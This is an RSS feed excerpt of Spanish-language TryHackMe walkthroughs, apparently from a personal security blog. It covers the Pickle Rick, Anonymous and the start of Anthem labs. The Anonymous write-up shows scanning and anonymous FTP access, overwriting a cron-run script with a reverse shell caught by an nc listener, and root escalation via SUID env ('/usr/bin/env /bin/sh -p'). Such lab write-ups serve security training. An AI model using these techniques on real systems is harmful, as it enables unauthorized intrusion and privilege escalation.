&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el codigo fuente de la pagina principal encontramos un comentario que indica un nombre de usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_005759.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el archivo &lt;code&gt;robots.txt&lt;/code&gt; encontramos una frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_005921.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la pagina &lt;code&gt;login.php&lt;/code&gt; encontramos un panel de inicio de sesion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_010045.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el usuario que encontramos con la frase en &lt;em&gt;robots.txt&lt;/em&gt; y logramos obtener acceso al portal de la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_010156.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ingredientes&#34;&gt;Ingredientes&lt;/h2&gt;
&lt;p&gt;En el portal encontramos un input en el que podemos ejecutar comandos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_010738.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Listamos los comandos pero no podemos utilizar &lt;code&gt;cat&lt;/code&gt; al parecer esta bloqueado, pero podemos utilizar &lt;code&gt;less&lt;/code&gt; para leer los archivos por lo que podemos leer los archivos del sistema y de la pagina, y vemos los comandos que no estan permitidos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_012523.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;primer-ingrediente&#34;&gt;Primer Ingrediente&lt;/h3&gt;
&lt;p&gt;Encontramos el &lt;em&gt;Primer Ingrediente&lt;/em&gt; en el directorio actual.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_013541.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;segundo-ingrediente&#34;&gt;Segundo Ingrediente&lt;/h3&gt;
&lt;p&gt;El &lt;em&gt;Segundo Ingrediente&lt;/em&gt; lo encontramos en el directorio principal de &lt;strong&gt;rick&lt;/strong&gt;, pero el dueño del archivo es el usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_013641.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar cualquier comando sin contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_013805.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Con &lt;code&gt;sudo less&lt;/code&gt; podemos leer el &lt;em&gt;Segundo Ingrediente&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_014014.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;tercer-ingrediente&#34;&gt;Tercer Ingrediente&lt;/h3&gt;
&lt;p&gt;En el directorio principal del usuario root encontramos el &lt;em&gt;Tercer Ingrediente&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_014235.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tercer Ingrediente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_014303.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/picklerick/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/picklerick/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Anonymous</title>
        <link>https://sckull.github.io/posts/anonymous/</link>
        <pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 20 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/anonymous/</guid>
        <description>Anonymous es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Anonymous es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Anonymous&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Not the hacking group&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;430&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Nameless0ne&#34;&gt;Nameless0ne&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), smb (445, 139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 20 23:42:51 2020 as: nmap -sV -o nmap_scan_mini anonymous.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; anonymous.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.243.66&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;996&lt;/span&gt; closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: ANONYMOUS&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 20 23:43:24 2020 -- 1 IP address (1 host up) scanned in 32.72 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 20 23:52:25 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anonymous.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; anonymous.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.243.66&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;113&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; 04:41 scripts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;NSE: writeable&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   STAT: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FTP server status:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Connected to ::ffff:10.8.6.160
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Logged in as ftp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      TYPE: ASCII
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      No session bandwidth limit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Session timeout in seconds is &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Control connection is plain text
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Data connections will be plain text
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      At session startup, client count was &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      vsFTPd 3.0.3 - secure, fast, stable
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: ANONYMOUS&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unknown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows 6.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Samba 4.7.6-Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: anonymous
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: ANONYMOUS&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Domain name: &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FQDN: anonymous
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2020-06-21T05:05:33+00:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: guest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-06-21T05:05:33
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Jun 21 00:05:40 2020 -- 1 IP address (1 host up) scanned in 795.29 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Mediante el servicio ftp en el puerto 21 ingresamos como anonymous (anonymous:anonymous) y pudimos listar los archivos y carpetas de la maquina, además descargarlos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_223515.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;En el archivo clean.sh encontramos un script en bash el cual elimina los archivos que se encuentran en la carpeta &lt;code&gt;/tmp/&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;El segundo archivo&lt;code&gt;removed_files.log&lt;/code&gt; que tiene el log de archivos que se han eliminado por el script &lt;code&gt;clean.sh&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Por ultimo está el archivo &lt;code&gt;to_do.txt&lt;/code&gt;, muestra un mensaje que seguramente algun usuario escribió.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_223844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Utilizamos smbclient para obtener informacion del servicio SAMBA en donde encontramos algunos SHARENAMES.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_224605.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el SHARENAME &lt;code&gt;pics&lt;/code&gt; es el unico en donde logramos entrar sin credenciales, en donde encontramos dos imagenes.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_224944.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
En el servicio SAMBA no logramos hacer nada, ya que solo tenemos el permiso de LISTAR&lt;/p&gt;
&lt;h2 id=&#34;ftp---user&#34;&gt;FTP - USER&lt;/h2&gt;
&lt;p&gt;Volvimos nuevamente al servicio FTP. Dentro de este servicio tenemos permisos para subir archivos, logramos subir un archivo de prueba.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_231044.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta a la que tenemos acceso hay un script (&lt;code&gt;clean.sh&lt;/code&gt;) descrito anteriormente, intentamos reemplazar este archivo, en el que pusimos un pequeño comando de ping (&lt;code&gt;ping -c 5 10.10.10.10&lt;/code&gt;) hacia nuestra IP. Hacemos esto ya que consideramos que alguien debe de ejecutar el script para poder limpiar la carpeta /tmp/, además que el archivo de log (&lt;code&gt;removed_files.log&lt;/code&gt;) del script, cada vez tiene más lineas.&lt;/p&gt;
&lt;p&gt;Subimos el archivo y con tcpdump capturamos el trafico de ping (icmp).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_231532.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener respuesta desde la maquina hacia la nuestra, por lo que sabemos que el script es ejecutado, probablemente por un cronjob.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_231532.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Volvemos a sobreescribir el archivo &lt;code&gt;clean.sh&lt;/code&gt; pero esta vez con una shell inversa. Ponemos a la escucha nuestra maquina (&lt;code&gt;nc -lvp 1338&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_232014.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además, podemos ver el cronjob que se ejecuta en la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_233324.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una enumeracion de binarios SUID con &lt;code&gt;find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lah&lt;/code&gt; y vemos que existe &lt;code&gt;env&lt;/code&gt; en la maquina. Utilizamos env para obtener una shell root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_232616.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos &lt;code&gt;/usr/bin/env /bin/sh -p&lt;/code&gt;, obtenemos una shell como usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymous/Screenshot_20200620_232710.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/anonymous/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/anonymous/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Anthem</title>
        <link>https://sckull.github.io/posts/anthem/</link>
        <pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 20 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/anthem/</guid>
        <description>Anthem es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Anthem es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Anthem&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Room&lt;/td&gt;
&lt;td&gt;Anthem&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Exploit a Windows machine in this beginner level challenge.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;670&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Chevalier&#34;&gt;Chevalier&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto rdp (3389) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
